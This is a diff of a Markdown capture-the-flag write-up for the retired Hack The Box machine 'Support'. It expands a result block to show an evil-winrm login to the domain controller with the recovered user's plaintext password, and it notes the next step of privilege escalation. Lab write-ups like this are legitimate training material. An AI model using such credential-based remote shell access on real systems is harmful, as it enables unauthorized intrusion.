@@ -783,13 +783,23 @@ The `support` user's password was recovered from its LDAP `info` field, and 
 
 **Result:**
 
-```
-Evil-WinRM shell v3.9Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\support\Documents>
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
+└─$ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
+
+Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\support\Documents> 
 ```
 
-_What this gives you:_ **Key finding:** an interactive PowerShell shell on `dc.support.htb` as the `support` domain user — foothold established.
+**Key finding:** an interactive PowerShell shell on `dc.support.htb` as the `support` domain user — foothold established.
 
-_Next:_ Capture the user flag to confirm access, then enumerate the account's group memberships to find a privilege-escalation path.
+**Next:** Capture the user flag to confirm access, then enumerate the account's group memberships to find a privilege-escalation path.
 
 <div align="center">
 <br>
